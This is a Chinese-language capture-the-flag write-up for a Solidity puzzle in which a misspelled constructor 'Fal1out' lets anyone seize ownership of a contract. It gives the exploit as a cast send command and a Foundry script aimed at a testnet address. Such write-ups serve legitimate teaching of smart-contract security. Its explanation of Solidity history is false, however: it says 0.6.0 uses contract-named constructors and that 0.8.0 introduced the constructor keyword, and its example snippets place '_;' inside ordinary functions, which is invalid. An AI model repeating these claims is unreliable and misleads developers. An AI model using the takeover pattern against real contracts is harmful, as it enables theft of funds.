合约代码：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

**目标为获得合约的所有权。**

难点为对solidity0.6.0构造函数的了解。

在solidity0.6.0中，构造函数要写成与合约同名的函数并且必须指定为`public`：

```solidity
contract MyContract {
    function MyContract() public {
        _;
    }
}
```

在solidity0.8.0中，使用 constructor 关键字，不允许指定可见性（构造函数总是只在部署时执行）：

```solidity
contract MyContract {
    constructor() {
        _;
    }
}
```

这道题问题出现在构造函数的拼写错误上，将Fallout错写成Fal1out，使构造函数变成普通函数，任何人都可以调用这个函数。

所以用cast调用函数：

```bash
cast send 0xFd866c41397594CeEC08b6ceFeBe66C073521325 "Fal1out()" --value 0 \
--private-key xxx \
--rpc-url https://sepolia.infura.io/v3/xxx
```

或者写脚本：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {Fallout} from "../src/Fallout.sol";

contract MyScript is Script {

    Fallout _fallout = Fallout(0xFd866c41397594CeEC08b6ceFeBe66C073521325);
    
    function run() external {
        vm.startBroadcast();

        _fallout.Fal1out();

        vm.stopBroadcast();
    }
}
```

运行脚本。